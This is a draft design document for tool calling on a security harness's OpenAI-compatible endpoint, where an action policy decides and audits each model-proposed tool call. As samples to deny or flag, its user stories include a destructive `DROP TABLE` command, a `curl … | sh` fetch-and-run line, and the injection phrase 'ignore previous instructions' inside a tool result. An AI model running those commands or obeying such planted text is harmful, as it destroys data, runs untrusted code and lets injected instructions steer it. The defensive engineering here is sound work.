---
id: PRD-017
slug: tool-calling
title: Tool Calling on the OpenAI-Compatible Endpoint — Every Tool Call Decided by the Action Policy Before the Client Sees It
status: draft
base_branch: main
epic_branch: epic/PRD-017-tool-calling
created: 2026-11-15
updated: 2026-11-15
---

> **Numbering.** The brief is [PRE-PRD-016](../../../pre-prds/PRE-PRD-016-tool-calling.md), and the track's briefs and older code comments call tool calling **"PRD-016"**. PRD-016 is the action policy engine ([PRD-016](../PRD-016-action-policy-rules/PRD.md)), so this is PRD-017. A comment that says "until PRD-016 admits `tool` turns" (`query_pipeline`, `pii_policy`, `pattern_config`, `audit_logger`, `messages`) means this document. Comments this PRD's stories touch are reworded; the rest read through this note. The runtime strings already say `(PRD-017)` (PRD-016 D14).

## 1. Executive Summary

After PRD-015, `/v1/chat/completions` speaks OpenAI Chat Completions for text and refuses everything to do with tools: a `tools` parameter, an assistant turn with `tool_calls`, or a `tool` turn is a 400 `tools_not_supported` ([app/services/v1_translate.py](../../../app/services/v1_translate.py)). The upstream client reads only `choices[0].message.content` and fails on a `tool_calls` response ([app/services/openrouter_client.py](../../../app/services/openrouter_client.py)). That makes the harness usable from the OpenAI SDKs, Aider and Continue, and unusable from OpenCode and Cline in agent mode, which do nothing without function calling.

PRD-016 built the missing safety piece and deliberately left it uncalled: a pure engine, `action_policy.evaluate_all(tool_calls, identity)`, that decides every tool call as `allow`, `flag` or `deny`, and `action_audit.record(decisions, identity, audit_id)`, which stores one row per call. This PRD lifts the refusal behind a feature flag and wires the engine in. The harness forwards `tools`, `tool_choice` and `parallel_tool_calls` upstream, admits `tool` turns and assistant `tool_calls` into the pipeline under the existing pattern and PII policies, parses `tool_calls` (with `content: null`) from the upstream, and **evaluates every call after the model produced it and before any byte of the response leaves the harness**. A denied call is removed from the response and replaced by an assistant note giving the reason, so the agent reads why and carries on instead of crashing. Every decision is recorded against the request's `audit_id`.

**MVP goal:** with `V1_TOOLS_ENABLED=true`, OpenCode and Cline each complete a small multi-file task through the harness against a scripted upstream; a model-generated `DROP TABLE` is denied, recorded in `action_decisions` with the request's `audit_id`, and the agent prints the reason; no tool-call argument is changed by any check; running `npm test` twice in one session is not held as a duplicate; and with the flag off, every `/v1` response is byte-identical to PRD-015's.

## 2. Mission

Let coding agents use tools through the harness without letting a single model-proposed action reach the client undecided.

Core principles:

- **Decide before release.** A `tool_call` exists only after the upstream answered, so that is where it is decided: after the upstream call and before the response is shaped, streamed or written to the audit. Nothing about a tool call is sent first and checked later — the buffered stream from PRD-015 D8 is what makes that free.
- **Deny the call, not the conversation.** One denied call removes that call, not the response. The agent keeps the calls it was allowed and reads a sentence explaining the one it lost (D1, D2). A 4xx for a response the model already produced would cost the agent its turn and teach it nothing.
- **Never change what the model or the client wrote into a call.** Tool-call arguments are not redacted, reformatted or re-serialized in either direction (PRD-012 Section 6.5's contract). A check may remove a call; it never edits one.
- **Same policies, more roles.** `tool` turns go through the pipeline's existing steps — context limits, duplicate, patterns (`code`: `tool: flag`), PII (`code` covers `tool`) — rather than a second path. PRD-011 and PRD-012 already defined the `tool` cells; this PRD makes them reachable.
- **Off means PRD-015.** Behind `V1_TOOLS_ENABLED` (default off), every request and response is exactly what PRD-015 shipped. The flag is the rollout tool and the rollback.
- **Evidence or nothing.** A response whose decisions cannot be recorded is not released (D8). The action audit is the reason enabling tools is acceptable at all.

## 3. Target Users

**Integrating Developer (coding agent).** Runs OpenCode or Cline in agent mode with the harness as its base URL. Needs reads, edits and `npm test` to go through, multi-step tool loops to work across many requests, and a denial to read as a sentence the agent can act on, not a malformed response or a retry storm.

**Security/Compliance Admin.** Needs to see, per request, which tools the model asked for, which the harness released and why the rest were stopped — joined to the prompt row that produced them — and needs the flag to turn the whole surface off.

**Platform Operator.** Owns `.env`, `ACTION_POLICY_FILE` and `MODEL_ALLOWLIST`. Needs one switch to enable tools, a way to keep tools away from models that cannot call them (D3), and per-client setup steps that work the first time.

**PRD-016 action policy** (internal). Its engine and audit are built and tested but unused. This PRD is its first caller and must keep its contracts: `evaluate_all` decides each call on its own; `record()` takes the `audit_id`; `reason` is safe to show the agent (PRD-016 T11).

## 4. MVP Scope

### In Scope

**Feature flag and settings (`app/config.py`)**
- [ ] `V1_TOOLS_ENABLED: bool = False` — off: PRD-015's refusals, byte for byte (D10)
- [ ] `V1_TOOL_MODELS: str = ""` — comma list; empty means every model the caller may already use; when set, a `tools` request for a model outside it is a 400 (D3, D16); each entry must be in `MODEL_ALLOWLIST` (startup validation)

**Message model (`app/models/messages.py`)**
- [ ] `Message` gains `tool_calls: tuple[ToolCallSpec, ...] = ()` and `tool_call_id: Optional[str] = None`, defaulted, so every existing `Message(role, content)` is unchanged (D5)
- [ ] `ToolCallSpec(id, name, arguments)` — `arguments` is the raw JSON string, never parsed and re-serialized
- [ ] `normalize_message` accepts `tool_calls` on `assistant` turns and `tool_call_id` on `tool` turns, validating shape only (names location and rule, never a value)

**Request translation (`app/services/v1_translate.py`)**
- [ ] With the flag on: `tools` (a list of `{type: "function", function: {name, description?, parameters?, strict?}}`), `tool_choice` (`none | auto | required | {type: "function", function: {name}}`) and `parallel_tool_calls` (bool) are validated and forwarded (D11)
- [ ] `functions` and `function_call` (the deprecated API) stay `tools_not_supported` whatever the flag (D10)
- [ ] Assistant `tool_calls` and `tool` turns accepted; conversation shape rules at the edge (D6), each failure a 400 `invalid_messages` naming the location
- [ ] `V1_TOOL_MODELS` refusal: 400 `tools_not_supported`, `param: "tools"` (D16)

**Pipeline (`app/services/query_pipeline.py`, `app/services/duplicate_checker.py`)**
- [ ] Step 0: last turn `user` **or** `tool`; the D6 shape rules repeated as the programming-error guard
- [ ] Step 1: `dedup_key` over tool turns (D4); keys of tool-free conversations unchanged
- [ ] Step 3: context characters count tool-call arguments too (D12)
- [ ] Step 5: patterns inspect `tool` turn content under the profile's `tool` cell (`code`: `flag`); arguments are not pattern-inspected (D13)
- [ ] Step 6: `tool` turn content redacted under the policy's `input_roles` (`code` covers `tool`); assistant `tool_calls` pass upstream untouched (D13)
- [ ] **Step 7c (new): action evaluation** — `evaluate_all` over the response's calls, the D1/D2 release rule, after the step 7b charge and before step 8
- [ ] Step 8: `has_tool_calls` set (D19); the row is written; then `record(decisions, identity, audit_id, session_id)`; a record failure fails closed (D8)
- [ ] The audit row's `prompt` is the final turn, user or tool (D7)

**Upstream (`app/services/openrouter_client.py`)**
- [ ] `ToolParams(tools, tool_choice, parallel_tool_calls)` passed as its own keyword, only when set, so the suite's three-argument stubs keep working — `GenerationParams` is not widened (PRD-010 T5)
- [ ] Messages serialized with `tool_calls` and `tool_call_id` when present; tool-free payloads byte-identical
- [ ] `tool_calls` parsed from `choices[0].message`; `content: null` with calls is `""`; `OpenRouterResult.tool_calls: tuple[ToolCallSpec, ...] = ()`
- [ ] A response with `tool_calls` to a request that sent no `tools` stays an `OpenRouterError` (D18) — `/query` and the chat UI keep today's behaviour

**Response (`app/services/v1_translate.py`, `app/models/v1_schemas.py`, `app/services/v1_sse.py`)**
- [ ] `AssistantMessage.content: Optional[str]` and `tool_calls`; `FinishReason` gains `tool_calls`
- [ ] The released calls, byte-identical arguments, `content: null` when there is no text and no note
- [ ] `harness.actions`: one `{tool_call_id, tool_name, decision, rule, reason}` per evaluated call (D14)
- [ ] Buffered SSE: `tool_calls` deltas in one burst, spec-valid, then the finish chunk (Section 6.6)

**Stub upstream (`scripts/stub_openrouter.py`)**
- [ ] Scripted replies can carry `tool_calls`; rules can match the last message of any role (a `tool` result), so a multi-step agent loop is scriptable; logging still never prints content

**Admin console and API**
- [ ] The Actions view's empty-state copy no longer says nothing calls the engine (PRD-016 hand-off)
- [ ] `GET /audit/actions` already filters by user; it gains `?audit_id=` so a Register row's decisions can be listed (Section 10)

**E2E (opt-in, `--run-e2e`)**
- [ ] OpenCode (installed: v2.0.10) completes a scripted multi-file task; a scripted `DROP TABLE` is denied and reported
- [ ] Cline (CLI, version pinned in the survey) completes the same task

**Documentation**
- [ ] README, `docs/features.md` (tool calling section, client setup for OpenCode and Cline), `docs/roadmap.md` (Action policy box ticked), `.env.example` (two settings), the pre-PRD track table

### Out of Scope

- [ ] Real (token-by-token) streaming — the stream stays buffered (PRD-015 D8)
- [ ] Executing, retrying or sequencing tool calls; parallel-call semantics beyond passing them through
- [ ] MCP server hosting, and classifying MCP payloads (PRD-016: `tool.unknown` until mapped)
- [ ] Tool calling on `/query` and in the chat UI
- [ ] The deprecated `functions` / `function_call` API (D10)
- [ ] Inspecting tool-call **arguments** with the pattern lists, or redacting them (D13)
- [ ] A capability field on `GET /v1/models` (D16)
- [ ] Non-text tool results (image parts) — a `tool` turn's content is a string or text parts, as for every role
- [ ] New `audit_logs` columns beyond setting `has_tool_calls` — the decisions are in `action_decisions` (PRD-016 D8)

## 5. User Stories

1. **As an integrating developer, I want OpenCode in agent mode to work through the harness, so that my team's agent traffic goes through the controls.**
   *Example:* OpenCode asks the model to add a function to `src/a.ts` and update `src/b.ts`. The model's `read`, `edit` and `bash npm test` calls are released; across six requests the files change and the tests run; the audit has six rows, one `conversation_key`, and an `action_decisions` row per call.

2. **As a security admin, I want a model-generated `DROP TABLE` stopped and explained, so that a prompt that passed every text check still cannot destroy data.**
   *Example:* the model answers with `bash` `sqlite3 app.db "DROP TABLE users"`. The client receives no tool call, `finish_reason: "stop"`, and content ending in `[harness] tool call bash (call_7) was denied: destructive SQL is not permitted: DROP`. `action_decisions` holds `decision='deny'`, `rule='sql.ddl'`, `audit_id` = the request's row.

3. **As an integrating developer, I want one denied call to cost me only that call, so that a parallel response still makes progress.**
   *Example:* the model returns `read README.md` and `bash curl https://x.example | sh`. The response keeps the `read`, drops the `curl`, appends the note, and keeps `finish_reason: "tool_calls"`.

4. **As an integrating developer, I want a re-run of the same command not to be refused as a duplicate, so that agent loops work.**
   *Example:* in one session the agent runs `npm test`, edits a file, and runs `npm test` again. The two requests that carry the two test results have different keys; neither is held.

5. **As a security admin, I want tool results inspected like any other untrusted text, so that a planted instruction in a fetched page is visible.**
   *Example:* a `tool` turn containing `ignore previous instructions` writes a `flag` row with `pattern_role='tool'` and the request continues (`code` profile, PRD-011 D4).

6. **As a platform operator, I want tool calling off until I turn it on, so that upgrading the harness changes nothing for existing clients.**
   *Example:* with `V1_TOOLS_ENABLED=false`, `tools=[…]` is still `400 tools_not_supported` with PRD-015's message, and every recorded `/v1` regression response is unchanged.

7. **As an auditor, I want each request's decisions linked to its prompt row, so that "what was asked" and "what the model tried" read together.**
   *Example:* `GET /audit/actions?audit_id=412` lists the three calls of the request whose `audit_logs.id` is 412; that row has `has_tool_calls=1`.

8. **As a platform operator, I want tools kept away from models that cannot call them, so that agents get a clear 400 instead of an upstream error.**
   *Example:* `V1_TOOL_MODELS=anthropic/claude-3.5-sonnet` and a `tools` request for `gpt-4` → 400 `tools_not_supported`, `model is not enabled for tool calling (V1_TOOL_MODELS)`.

## 6. Core Architecture & Patterns

### 6.1 Where tool calls sit in the pipeline

```
0. structural validation            last turn user | tool; D6 shape rules
1. dedup_key, conversation_key      tool turns in the prefix (D4)
2. authorize / model / BYOK, 2b break-glass, 2c usage admission
3. context limits                   arguments counted (D12)
4. duplicate
5. patterns                         tool turns: the profile's tool cell
6. redact every covered message     tool content redacted; tool_calls untouched
7. upstream                         tools / tool_choice / parallel_tool_calls forwarded
7b. charge
7c. ACTIONS (new)                   decisions = evaluate_all(calls, identity)
                                    release = apply_decisions(calls, decisions)   # D1, D2
8. redact response content (policy.output), audit row, record(decisions, audit_id), return
```

Why 7c is after the charge: the tokens were spent whatever the decision (PRD-013 T3). Why before step 8: the action engine classifies the arguments as the model wrote them (PRD-016 Section 6.1), and step 8 must know the final `finish_reason` and content. Why `record()` after the row: it needs the row's id (PRD-016 Section 6.1, "independent of the audit row").

Every verdict is still decided before step 7, so PRD-015's stream commit rule (D8) is unchanged: a request committed to SSE can only end in a completion or a fault, never in a 4xx verdict. A response whose every call is denied is a completion (`finish_reason: "stop"`), not a verdict.

### 6.2 The message model (D5)

```python
@dataclass(frozen=True)
class ToolCallSpec:
    id: str
    name: str
    arguments: str          # the raw JSON string, as written; never parsed here

@dataclass(frozen=True)
class Message:
    role: Role
    content: str
    tool_calls: tuple[ToolCallSpec, ...] = ()   # assistant only
    tool_call_id: Optional[str] = None          # tool only
```

`ToolCallSpec` is not `action_adapters.ToolCall` on purpose: `messages.py` imports nothing from `app` (its docstring), and the engine's type is the engine's. Converting is one line at step 7c. The three fields are the same, so a test asserts they stay aligned.

Normalization rules (each a `MessageNormalizationError` naming the location and the rule):

| Field | Rule |
|---|---|
| `tool_calls` | only on `assistant`; a non-empty list; each `{id: str, type: "function", function: {name: str, arguments: str}}`; ids unique in the turn. `[]` is accepted and normalizes to `()` (OpenAI SDKs send it) |
| `tool_call_id` | required on `tool`, a non-empty string; refused on any other role |
| `content` | unchanged rules; an assistant turn with `tool_calls` may have `null` content (already allowed) |

### 6.3 Conversation shape (D6)

Checked at the `/v1` edge (400 `invalid_messages`) and again at step 0 (`InvalidConversationError`, the programming-error guard, PRD-010 Section 6.1):

1. The last turn is `user` or `tool`.
2. A `tool` turn's `tool_call_id` is one of the ids of the nearest preceding `assistant` turn that has `tool_calls`, with only `tool` turns between them.
3. An id is answered at most once.
4. The conversation contains at least one `user` turn. *Added by orchestrator decision (STORY-005 plan):* `conversation_key` and the dedup anchor (Section 6.4) both key on a user turn, so `[assistant(tool_calls), tool]` would otherwise pass rules 1–3 and fail at step 1.

Rule 3 is counted per assistant turn: some providers reuse `call_0` on every round (STORY-005 plan).

Not required: that every call is answered (the upstream decides that; OpenRouter and the providers vary), or that the turn before the last `tool` turn is anything in particular. The rules are OpenAI's own message validation, so a conversation the harness accepts is one the upstream accepts.

### 6.4 Duplicate key over tool turns (D4)

```
dedup_key = sha256_json([v1, user_id, hash_prompt(anchor.content), prefix_hash])
anchor    = the last user turn
prefix    = every other turn, in order, with the anchor's position marked
frame     = [role, content]                        tool-free turn (today's frame)
          = [role, content, [[id, name, arguments], ...]]   assistant with tool_calls
          = [role, content, tool_call_id]          tool turn
```

- **Unchanged keys.** A conversation with no turn after the anchor and no tool fields hashes exactly as today, so an upgrade does not reset anyone's 24-hour window. A test pins today's keys.
- **Tool turns are never the anchor** (the brief's D4). The anchor stays what the user asked; tool turns, and assistant turns after the anchor, go into the prefix hash, with the anchor's position marked so `[u1, A, T, u2]` and `[u1, u2, A, T]` cannot collide.
- **Why `npm test` twice is not a duplicate.** Each request in a tool loop carries a longer prefix than the one before it (another assistant turn, another result, another call id), so no two requests of one loop share a key. A client resending one request byte for byte — an auto-retry — still is a duplicate, which is the point of the check (PRD-009).

### 6.5 What each check does with tool content

| Check | `tool` turn content | assistant `tool_calls` (history) | response `tool_calls` |
|---|---|---|---|
| Context limit (step 3) | counted (content) | counted (`len(arguments)`) | — |
| Duplicate key (step 1) | prefix | prefix | — |
| Patterns (step 5) | the profile's `tool` cell (`code`: `flag`) | not inspected | not inspected |
| PII input (step 6) | redacted if `tool` ∈ `input_roles` | **never** | — |
| Action policy (7c) | — | — | every call evaluated |
| PII output (step 8) | — | — | **never**; only `content` when `policy.output` |
| Audit row | `prompt` when it is the final turn (D7) | — | `has_tool_calls`; decisions in `action_decisions` |

Arguments are not pattern-inspected (D13): the pattern lists are prompt-injection phrases, and a call's arguments are the model's proposal, which the action policy classifies by what it does. Running both on the same string would flag every agent that writes the word "ignore" into a file.

### 6.6 Release: what the client receives (D1, D2, D9, D14)

`apply_decisions(calls, decisions) -> Release` is pure, in a new module `app/services/tool_release.py`:

```python
@dataclass(frozen=True)
class Release:
    tool_calls: tuple[ToolCallSpec, ...]   # allow and flag, in model order, unmodified
    notes: tuple[str, ...]                 # one per deny, in model order
    finish_reason: Optional[str]           # "tool_calls" if any released, else "stop"
```

- `allow` and `flag` are released (PRD-016 D10: flag never blocks). `deny` is dropped.
- A note is the fixed template `[harness] tool call {name} ({id}) was denied: {reason}`. `reason` is PRD-016's safe reason (T11); `name` and `id` are the model's own strings, cut to 64 characters.
- Notes are appended to the content after output redaction, separated by a blank line, so they are never masked or altered: `content = "\n\n".join(filter(None, [content, *notes]))`.
- `finish_reason`: `tool_calls` when at least one call is released; `stop` when the upstream reported `tool_calls` and none survive; otherwise the upstream's as today.
- Content `""` with no note and calls released is sent as `null`, which is what OpenAI sends and what the SDKs expect.

`harness.actions` (on the non-streamed body only) lists one `{tool_call_id, tool_name, decision, rule, reason}` per evaluated call, released or not. The SDKs keep unknown fields, so clients that do not read it ignore it; tests and operators read it. Streamed responses do not carry it (chunks have no `harness` object in PRD-015); the audit does.

**Buffered SSE (Section 7.6 of PRD-015, extended).** After commit and keep-alives:

```
data: {"choices":[{"index":0,"delta":{"role":"assistant","content":<content or null>},"finish_reason":null}]}
data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_1","type":"function","function":{"name":"read","arguments":"{\"filePath\":\"a.ts\"}"}}]},"finish_reason":null}]}
data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":1, ...}]},"finish_reason":null}]}
data: {"choices":[{"index":0,"delta":{},"finish_reason":"tool_calls"}]}
data: {"choices":[],"usage":{...}}     (include_usage only)
data: [DONE]
```

One chunk per released call, each carrying its whole `arguments` string — spec-valid (a client concatenates per `index`, and one fragment is a complete one), and the shape the OpenAI SDK's stream accumulator and both target clients accept (verified per client in the E2E stories, Risk 2).

### 6.7 Feature flag (D10)

`V1_TOOLS_ENABLED=false` (default): `translate_request` refuses exactly as PRD-015 does, with the same codes and messages, and nothing downstream can see a tool turn. Asserted by running the PRD-015 request/response regression tests unchanged with the flag off. `true`: the translator admits tools and the router passes `ToolParams` through. The flag is read per request (the `_context_limit_exceeded` rule), so tests flip it with `monkeypatch`.

`functions` and `function_call` stay refused either way: they are the deprecated API, no target client sends them, and admitting them would be a second translation of the same feature.

### 6.8 Directory structure (files touched)

```
app/
├── config.py                       # + V1_TOOLS_ENABLED, V1_TOOL_MODELS, validators
├── models/
│   ├── messages.py                 # ToolCallSpec; Message.tool_calls / tool_call_id; normalizer
│   └── v1_schemas.py               # tool request fields; AssistantMessage.tool_calls; FinishReason; ChunkDelta.tool_calls; harness.actions
├── routers/
│   ├── v1.py                       # ToolParams through _Upstream; release into the completion
│   └── admin.py                    # GET /audit/actions?audit_id=
├── db/database.py                  # list_action_decisions(audit_id=)
└── services/
    ├── v1_translate.py             # tools classification under the flag; tool turns; result + SSE shapes
    ├── v1_sse.py                   # tool_calls deltas
    ├── openrouter_client.py        # ToolParams; tool message serialization; tool_calls parsing
    ├── duplicate_checker.py        # dedup_key over tool turns (D4)
    ├── query_pipeline.py           # step 0, 3, 5, 6 widened; step 7c; record(); has_tool_calls
    └── tool_release.py             # NEW: apply_decisions -> Release (pure)
chat_ui/chat_ui/admin_copy.py       # Actions empty-state copy
scripts/stub_openrouter.py          # scripted tool_calls; match on any last turn
tests/
├── test_tool_release.py            # NEW
├── test_query_pipeline_tools.py    # NEW: steps 0-8 with tool turns and tool_calls
├── test_v1_tools.py                # NEW: router, flag, shapes, SSE, harness.actions
├── test_tool_calling_criteria.py   # NEW: the brief's success criteria in-process
└── e2e/test_opencode.py, e2e/test_cline.py   # NEW, opt-in
docs/features.md, docs/roadmap.md, README.md, .env.example, pre-prds/
```

### 6.9 Patterns followed

- **Call site chooses, request never does** — `profile="code"`, `ingress="v1"` and now the tool params come from the router, not the body's own say-so (PRD-011 Section 6.6).
- **Defaulted dataclass fields** for widening a shared model, so positional construction everywhere keeps working (PRD-013's `OpenRouterResult` precedent).
- **Separate keyword, passed only when set** — `params=`'s rule (PRD-010 STORY-005), so every stub with signature `(messages, model, api_key)` keeps working.
- **Pure modules, I/O at the edges** — `messages`, `v1_translate`, `v1_sse` and the new `tool_release` read no settings and do no I/O; the pipeline holds the calls to the engine and the audit.
- **Messages name the location and the rule, never the value** (PRD-010, PRD-015 T6).
- **Required keyword for every row-writing arm** — `has_tool_calls` joins the `_deny` discipline where a row can now carry it (PRD-013 Section 6.9).

## 7. Tools/Features

### F1 — Settings and flag
`V1_TOOLS_ENABLED`, `V1_TOOL_MODELS` (Section 9.3), read per request.

### F2 — Message model
Section 6.2. `normalize_message` / `normalize_messages` keep their signatures.

### F3 — Request translation
Section 4's rules. `tools` items are validated for shape and forwarded as received (the parsed JSON values, re-serialized by `httpx` — they are the client's schema, not a call's arguments); `parameters` is any JSON object and is not interpreted. `V1Call` gains `tools: Optional[ToolParams]`.

### F4 — Pipeline widening
Steps 0, 1, 3, 5, 6 as Section 6.5; the audit `prompt` is the final turn (D7), and only the final turn's PII entities count toward the row's PII fields (PRD-010 D7, generalized from "the last user turn").

### F5 — Upstream client
Section 4. Messages serialize as `{"role", "content"}` plus `tool_calls: [{id, type: "function", function: {name, arguments}}]` or `tool_call_id` when set. An assistant turn with calls and `""` content serializes `content: null`.

### F6 — Action evaluation and release
Step 7c and `tool_release.apply_decisions` (Section 6.6). `ToolCallSpec` → `action_adapters.ToolCall` field for field.

### F7 — Decision audit
`record(decisions, identity, audit_id=<row id>, session_id=session_id)` after `log_query`; a `StorageError` from it is raised as `ActionAuditError` and mapped by the router to 500 `internal_error`, retryable (D8). `has_tool_calls` (D19).

### F8 — Response and stream
`translate_result` takes the release; Section 6.6 shapes; `harness.actions`.

### F9 — Stub upstream
A reply may carry `tool_calls: [{id?, name, arguments}]` (ids generated when absent, `finish_reason` defaulting to `tool_calls`); matchers may name `role` (default `user`, today's behaviour) to match the last message of that role, and `last_role` to require the conversation to end on a given role.

### F10 — Admin
Actions empty-state copy; `GET /audit/actions?audit_id=`.

### F11 — E2E
Per client: a throwaway repository, the harness on the stub, the client pointed at `/v1` with `V1_TOOLS_ENABLED=true`, an action policy file with the client's workspace root and `shell.allow`. Assert the files changed, the audit (rows, `has_tool_calls`, decisions joined by `audit_id`), the denied `DROP TABLE` reported by the client, and record the client's exact request shapes.

## 8. Technology Stack

| Layer | Choice | Note |
|---|---|---|
| Wire format | OpenAI Chat Completions tool calling | `tools`, `tool_choice`, `parallel_tool_calls`, `tool_calls`, `tool` role |
| Upstream | OpenRouter, via `httpx` | Normalizes tool calling across providers; unchanged client |
| Engine | PRD-016 `action_policy`, `action_audit` | No change to their contracts |
| Clients (E2E) | OpenCode 2.0.10 (installed globally on the dev machine); Cline CLI, version pinned by STORY-001 and installed into a git-ignored directory, never globally | PRD-016's survey pinned OpenCode v1.19.5 and Cline 4.1.26; STORY-001 re-verifies the built-in mappings against these versions |
| Tests | `pytest`; E2E opt-in with `--run-e2e` | The stub upstream answers with scripted tool calls (outbound OpenRouter fails from the dev machine, PRD-015 Risk 7) |

## 9. Security & Configuration

### 9.1 Authentication & authorization
Unchanged: `/v1` requires `query:submit`; break-glass refused. The action engine runs for the already-authorized identity; grants come from `RBAC_ROLES_FILE` through `holds()` (PRD-016 D7).

### 9.2 Threat reasoning

| # | Threat | Treatment |
|---|---|---|
| T1 | **A tool call reaches the client undecided** — a code path that returns before 7c, or a stream that sends calls early | 7c is the only producer of the response's `tool_calls`; the result translator takes a `Release`, never the raw upstream calls; the stream is buffered (D8 of PRD-015). A test asserts that a monkeypatched `evaluate_all` returning `deny` for every call leaves no call in either response shape |
| T2 | **Arguments altered by a check** — PII redaction or re-serialization changes a path, a patch or an escaped string | Arguments are strings end to end; no step parses and re-dumps them; PII never sees them (D13). A test sends PII-looking and escape-heavy arguments both ways and compares bytes |
| T3 | **A forged history** — the client writes an assistant `tool_calls` turn or a `tool` result carrying an injection | `tool` content is pattern-inspected (`flag`) and PII-redacted under `code`; history calls are not re-evaluated (they were the client's to run; re-deciding history would deny a call the harness already released). Stated in the docs |
| T4 | **Denial bypass by retry** — the agent asks the model again until a variant is allowed | Each variant is evaluated; PRD-016's evasion corpus bounds what a variant can achieve; every attempt is recorded. Usage limits cap the loop |
| T5 | **Unrecorded release** — the audit fails and the calls go out anyway | Fail closed (D8): no release without the decision rows |
| T6 | **Reason leaks the policy** | Notes carry PRD-016's `reason`, which never contains a configured value (T11) |
| T7 | **Tool schema as an injection carrier** — a `tools[].description` holding an instruction | The client's own tool list, sent to the model the client chose; not inspected, as `system` is not under `code` (PRD-011). Out of scope, stated |
| T8 | **Huge tool results** | Counted by the context limit (step 3) and the PII size limit (step 6), as any content |
| T9 | **Flag left on by accident in a deployment without an action policy** | The built-in policy is deny-by-default for every dangerous class (PRD-016); the docs say to configure `ACTION_POLICY_FILE` first |

### 9.3 Configuration

| Variable | Default | Validation | Purpose |
|---|---|---|---|
| `V1_TOOLS_ENABLED` | `false` | bool | Admit tools on `/v1` |
| `V1_TOOL_MODELS` | `""` | each entry in `MODEL_ALLOWLIST`, or startup error naming it | Models a `tools` request may name; empty = no extra restriction |

### 9.4 Out of scope (security)
Executing or sandboxing tools; re-evaluating history calls; inspecting tool schemas; MCP payloads.

## 10. API Specification

**`POST /v1/chat/completions`** with `V1_TOOLS_ENABLED=true`:

```json
{"model": "anthropic/claude-3.5-sonnet", "stream": false,
 "tools": [{"type": "function", "function": {"name": "bash", "parameters": {"type": "object"}}}],
 "tool_choice": "auto",
 "messages": [
   {"role": "user", "content": "drop the users table"},
   {"role": "assistant", "content": null, "tool_calls": [{"id": "call_1", "type": "function", "function": {"name": "bash", "arguments": "{\"command\":\"ls\"}"}}]},
   {"role": "tool", "tool_call_id": "call_1", "content": "app.db"}
 ]}
```

Response when the model's next call is denied:

```json
{"id": "chatcmpl-harness-412", "object": "chat.completion", "created": 1763200000, "model": "anthropic/claude-3.5-sonnet",
 "choices": [{"index": 0, "logprobs": null, "finish_reason": "stop",
   "message": {"role": "assistant", "tool_calls": null,
     "content": "[harness] tool call bash (call_2) was denied: destructive SQL is not permitted: DROP"}}],
 "usage": {"prompt_tokens": 40, "completion_tokens": 12, "total_tokens": 52},
 "harness": {"audit_id": 412, "pii_redacted": false, "pii_entities_masked": [],
   "actions": [{"tool_call_id": "call_2", "tool_name": "bash", "decision": "deny", "rule": "sql.ddl",
                "reason": "destructive SQL is not permitted: DROP"}]}}
```

`tool_calls` is `null` when none is released (the key kept, as `logprobs` is; PRD-015's serialization rule). *Orchestrator decision (STORY-011 plan):* a response with no evaluated calls — every text-only response, flag on or off — carries neither `tool_calls` nor `harness.actions`, so its body is PRD-015's byte for byte; both keys appear only once calls were evaluated. New refusals, all 400 before the pipeline, no row:

| Condition | `code` | `param` |
|---|---|---|
| Flag off and any tool feature present | `tools_not_supported` (PRD-015's messages) | as today |
| `functions` / `function_call` | `tools_not_supported` | the key |
| Malformed `tools` item, `tool_choice` or `parallel_tool_calls` | `invalid_parameter` | e.g. `tools[2].function.name` |
| `tool_choice` names a function not in `tools` | `invalid_parameter` | `tool_choice` |
| Model not in `V1_TOOL_MODELS` | `tools_not_supported` | `tools` |
| D6 shape rule broken | `invalid_messages` | `messages[i]` |

**`GET /audit/actions`** gains `?audit_id=<int>`, combined with `decision` and scoped exactly as today.

Internal API:

```python
messages.ToolCallSpec(id, name, arguments)
openrouter_client.ToolParams(tools, tool_choice=None, parallel_tool_calls=None)
call_openrouter(messages, model, api_key, params=None, client=None, *, tools=None) -> OpenRouterResult   # .tool_calls
tool_release.apply_decisions(calls, decisions) -> Release
run_conversation(..., *, tools: Optional[ToolParams] = None)   # the router passes it; no other caller does
```

## 11. Success Criteria

### MVP definition
The brief's five criteria hold: OpenCode and Cline each complete the scripted multi-file task (E2E reports); a model-generated `DROP TABLE` is denied, audited with its `audit_id`, and reported by the agent; no argument is modified by any check; `npm test` twice in one session is not a duplicate; and the full suite is green with the flag off and the PRD-015 regression suites unchanged.

### Functional requirements
- [ ] Flag off: every PRD-015 `tools_not_supported` test passes unchanged; a `tool_calls` upstream response to `/query` is still an upstream error
- [ ] Flag on: `tools`, `tool_choice` (all four forms) and `parallel_tool_calls` reach the upstream payload byte-equal to what was sent; `functions` is refused
- [ ] A conversation ending in a `tool` turn is accepted; each D6 rule has a refusing test at the edge and at step 0
- [ ] Tool-free `dedup_key`s are unchanged (pinned values); two requests of one tool loop never share a key; an identical resend does
- [ ] A `tool` turn with an injection phrase writes a `flag` row with `pattern_role='tool'` under `code`; a `tool` turn with an email is redacted upstream under `code`; the same email inside history `tool_calls` arguments reaches the upstream unredacted
- [ ] `tool_calls` arguments are byte-identical: client → upstream (history) and upstream → client (response), with PII, unicode and escape-heavy arguments
- [ ] `DROP TABLE` via `bash`/`sqlite3` and via a mapped SQL tool → no call released, `finish_reason: "stop"`, note in content, `harness.actions[0].rule == "sql.ddl"`, one `action_decisions` row with the row's `audit_id`
- [ ] A mixed response keeps the allowed calls in order, drops the denied one, `finish_reason: "tool_calls"`, one note
- [ ] A `flag` decision is released and recorded as `flag`
- [ ] `record()` failure → 500 `internal_error`, no call released (non-streamed: the body; streamed: the `error` event)
- [ ] `has_tool_calls=1` on a row whose request or response carried calls; `0` otherwise
- [ ] Streamed: the Section 6.6 chunk sequence, parsed by the OpenAI Python SDK's stream accumulator into the same message the non-streamed body carries
- [ ] `V1_TOOL_MODELS` set and an unlisted model → 400; an entry outside `MODEL_ALLOWLIST` → startup error
- [ ] `GET /audit/actions?audit_id=` returns that request's decisions only, under `audit:read:own` scoping

### Quality indicators
- [ ] Full suite green; no pre-existing assertion changed except where a story names it, each with a comment citing PRD-017 and the decision
- [ ] `tool_release`, `messages`, `v1_translate`, `v1_sse` stay pure (no settings, no I/O)
- [ ] Step 7c's added latency measured over the PRD-016 synthetic corpus and recorded (target: p95 under 5 ms per response with ≤ 8 calls)
- [ ] Each E2E report pins the client version, the command line, the config used, and the client's request keys

## 12. Implementation Phases

### Phase 1 — Survey and foundations (Stories 1–3)
**Goal:** know what the two clients send, and widen the shared types without changing any existing behaviour.
